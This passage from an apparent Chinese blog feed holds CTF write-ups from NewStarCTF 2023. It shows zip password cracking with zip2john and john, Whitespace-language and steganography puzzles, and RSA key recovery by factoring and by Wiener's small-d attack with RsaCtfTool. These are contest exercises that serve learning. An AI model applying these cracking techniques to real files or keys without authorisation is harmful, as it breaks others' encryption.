文件注释长度\n</code></pre>\n<p>使用 010editor 打开文件如下所示：</p>\n<p><img data-src=\"image-20231002153058559.png\" alt=\"image-20231002153058559\"></p>\n<p>将前 4 位更改为如下所示，并将文件更改为 zip 文件。</p>\n<pre><code>50 4B 03 04\n</code></pre>\n<p>将文件解压缩后得到 flag.zip 文件，flag.zip 文件解压需要密码，通过 binwalk 发现存在文件注释：</p>\n<p><img data-src=\"image-20231002153942872.png\" alt=\"image-20231002153942872\"></p>\n<pre><code>SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg==\n</code></pre>\n<p>利用 Base64 解码得到： <code>I like six-digit numbers because they are very concise and easy to remember.</code> ，说明密码位数为 6，可以利用爆破进行破解。我们使用 <strong>john</strong> 进行破解（fcrackzip 解不开，都说不是加密对象）：</p>\n<p>首先使用以下命令，获得 zip 的中间 Hash 文件 flag.hash</p>\n<pre><code>zip2john flag.zip &gt; flag.hash\n</code></pre>\n<p>再利用  <code>john flag.hash</code>   进行破解得到如下：</p>\n<p><img data-src=\"image-20231002160943962.png\" alt=\"image-20231002160943962\"></p>\n<p>因而密码为  <code>232311</code> ，解压缩 flag.zip 文件得到 flag 文件： <code>flag&#123;y0u_ar3_the_m4ter_of_z1111ppp_606a4adc&#125;</code></p>\n<h2 id=\"空白格\"><a class=\"markdownIt-Anchor\" href=\"#空白格\">#</a> 空白格</h2>\n<p>题目给出了一个 white.zip 文件</p>\n<p><strong>考点：WhiteSpace 语言</strong></p>\n<p>解压后是一个 txt 文件，里面没有任何内容：</p>\n<p><img data-src=\"image-20231002161317063.png\" alt=\"image-20231002161317063\"></p>\n<p>该题考察的是 WhiteSpace 语言，将 txt 中的内容全选复制，利用<span class=\"exturl\" data-url=\"aHR0cHM6Ly92aWk1YXJkLmdpdGh1Yi5pby93aGl0ZXNwYWNlLz9hY2Nlc3NUb2tlbj1leUpoYkdjaU9pSklVekkxTmlJc0ltdHBaQ0k2SW1SbFptRjFiSFFpTENKMGVYQWlPaUpLVjFRaWZRLmV5SmxlSEFpT2pFMk9UWXlNVEkzT0Rnc0ltWnBiR1ZIVlVsRUlqb2lXRXR4TkRJeFJVSkxla1o1VW5wQlRpSXNJbWxoZENJNk1UWTVOakl4TWpRNE9Dd2lhWE56SWpvaWRYQnNiMkZrWlhKZllXTmpaWE56WDNKbGMyOTFjbU5sSWl3aWRYTmxja2xrSWpvdE9ESTROamczT1RRNU5YMC5tcktuOVItMS1zOW44bWhCcVc3bWIyR3RDa3p2N1hZMjI5VFlPRFpUV0s0\">在线网站</span>在线运行：</p>\n<p><img data-src=\"image-20231002161549733.png\" alt=\"image-20231002161549733\"></p>\n<p>得到 flag 为  <code>flag&#123;w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04&#125;</code></p>\n<h2 id=\"隐秘的眼睛\"><a class=\"markdownIt-Anchor\" href=\"#隐秘的眼睛\">#</a> 隐秘的眼睛</h2>\n<p>题目给出了一个压缩文件，其中有眼睛图片。</p>\n<p><strong>考点：SlientEye 隐写</strong></p>\n<p>使用 SlientEye 工具进行 Decode 即可获得 flag：</p>\n<p><img data-src=\"image-20231002164212579.png\" alt=\"image-20231002164212579\"></p>\n<p>flag 为： <code>flag&#123;R0ck1ng_y0u_63b0dc13a591&#125;</code></p>\n",
            "tags": []
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/01/BUUCTF%E2%80%94BABYRSA/",
            "url": "http://yanagi-kon.github.io/2023/10/01/BUUCTF%E2%80%94BABYRSA/",
            "title": "NewStarCTF 2023 公开赛道 Crypto题目",
            "date_published": "2023-10-01T11:28:00.000Z",
            "content_html": "<h2 id=\"buuctf-crypto-babyrsa-task_4\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-crypto-babyrsa-task_4\">#</a> BUUCTF - Crypto babyrsa task_4</h2>\n<p>题目如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> flag <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">gen_prime</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    res <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        res <span class=\"token operator\">*=</span> getPrime<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    n <span class=\"token operator\">=</span> gen_prime<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></pre></td></tr></table></figure><p>利用在线网站可以将所给的 n 分解素数为以下 15 个：</p>\n<pre><code>2217990919\n2338725373\n2370292207\n2463878387\n2706073949\n2794985117\n2804303069\n2923072267\n2970591037\n3207148519\n3654864131\n3831680819\n3939901243\n4093178561\n4278428893\n</code></pre>\n<p>公钥如上</p>\n<p>n = 以上公钥相乘</p>\n<p>phi = 17290065983330319066216184030777067976382697670733255200004943703459332462321021486252411405242719735544959857825124088104221030960082400051200</p>\n<p>e = 65537</p>\n<p>d * e mod phi = 1 即 由相关数学概念可知，d 是 e 的逆元，标记为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>e</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding=\"application/x-tex\">e^{-1}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span></span></span></span>,</p>\n<p>利用 扩展欧几里得算法 和 求解逆元算法</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">extended_gcd</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> b <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">return</span> a<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    gcd<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> y <span class=\"token operator\">=</span> extended_gcd<span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> a <span class=\"token operator\">%</span> b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> gcd<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">,</span> x <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">//</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> y</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">inverse_modulo</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    gcd<span class=\"token punctuation\">,</span> inverse<span class=\"token punctuation\">,</span> _ <span class=\"token operator\">=</span> extended_gcd<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> gcd <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">raise</span> ValueError<span class=\"token punctuation\">(</span><span class=\"token string\">\"The inverse does not exist.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> inverse <span class=\"token operator\">%</span> p</pre></td></tr></table></figure><p>代码如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">extended_gcd</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> b <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">return</span> a<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    gcd<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> y <span class=\"token operator\">=</span> extended_gcd<span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> a <span class=\"token operator\">%</span> b<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> gcd<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">,</span> x <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">//</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> y</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">inverse_modulo</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    gcd<span class=\"token punctuation\">,</span> inverse<span class=\"token punctuation\">,</span> _ <span class=\"token operator\">=</span> extended_gcd<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> gcd <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">raise</span> ValueError<span class=\"token punctuation\">(</span><span class=\"token string\">\"The inverse does not exist.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> inverse <span class=\"token operator\">%</span> p</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fastExpMod</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>               <span class=\"token comment\">#快速幂</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">while</span> e <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token comment\"># ei = 1, then mul</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            result <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>result <span class=\"token operator\">*</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> m</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        e <span class=\"token operator\">>></span><span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\"># b, b^2, b^4, b^8, ... , b^(2^n)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        b <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>b<span class=\"token operator\">*</span>b<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> m</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">return</span> result</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>n1 <span class=\"token operator\">=</span> <span class=\"token number\">2217990919</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>n2 <span class=\"token operator\">=</span> <span class=\"token number\">2338725373</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>n3 <span class=\"token operator\">=</span> <span class=\"token number\">2370292207</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>n4 <span class=\"token operator\">=</span> <span class=\"token number\">2463878387</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>n5 <span class=\"token operator\">=</span> <span class=\"token number\">2706073949</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>n6 <span class=\"token operator\">=</span> <span class=\"token number\">2794985117</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>n7 <span class=\"token operator\">=</span> <span class=\"token number\">2804303069</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>n8 <span class=\"token operator\">=</span> <span class=\"token number\">2923072267</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>n9 <span class=\"token operator\">=</span> <span class=\"token number\">2970591037</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>n10 <span class=\"token operator\">=</span> <span class=\"token number\">3207148519</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>n11 <span class=\"token operator\">=</span> <span class=\"token number\">3654864131</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>n12 <span class=\"token operator\">=</span> <span class=\"token number\">3831680819</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>n13 <span class=\"token operator\">=</span> <span class=\"token number\">3939901243</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>n14 <span class=\"token operator\">=</span> <span class=\"token number\">4093178561</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>n15 <span class=\"token operator\">=</span> <span class=\"token number\">4278428893</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>n1<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n2<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n3<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n4<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n5<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n6<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n7<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n8<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n9<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n10<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n11<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n12<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n13<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n14<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n15<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>d <span class=\"token operator\">=</span> inverse_modulo<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"The inverse of </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>e<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> modulo </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>phi<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> is </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>inverse<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>m <span class=\"token operator\">=</span> fastExpMod<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>flag 为： <code>flag&#123;us4_s1ge_t0_cal_phI&#125;</code></p>\n<h2 id=\"buuctf-crypto-small-d-task_5\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-crypto-small-d-task_5\">#</a> BUUCTF - Crypto small d  task_5</h2>\n<p>原题目如下：</p>\n<p><img data-src=\"image-20230928143400881.png\" alt=\"image-20230928143400881\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>d <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></pre></td></tr></table></figure><p>从题目可以看出，其名称为 Small d，并给出了一个人名 **<span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvV2llbmVyJTI3c19hdHRhY2s=\">Michael J. Wiener</span>**，该攻击针对 RSA，当 d 很小时，攻击使用连分数法来暴露私钥 d。</p>\n<p>我们直接用 rsactftool 脚本跑</p>\n<pre><code>https://github.com/RsaCtfTool/RsaCtfTool\n</code></pre>\n<pre><code class=\"language-cmd\">python3 RsaCtfTool.py -n 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433 -e 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825 --uncipher 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248 --attack wiener\n</code></pre>\n<p>得出以下内容：</p>\n<p><img data-src=\"image-20230928152305659.png\" alt=\"image-20230928152305659\"></p>\n<p>所以 flag 为： <code>flag&#123;learn_some_continued_fraction_technique#dc16885c&#125;</code></p>\n<h2 id=\"buuctf-crypto-babyxor-task_3-简单的异或\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-crypto-babyxor-task_3-简单的异或\">#</a> BUUCTF - Crypto babyxor  task_3 简单的异或</h2>\n<p>题目：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>ciphertext <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td 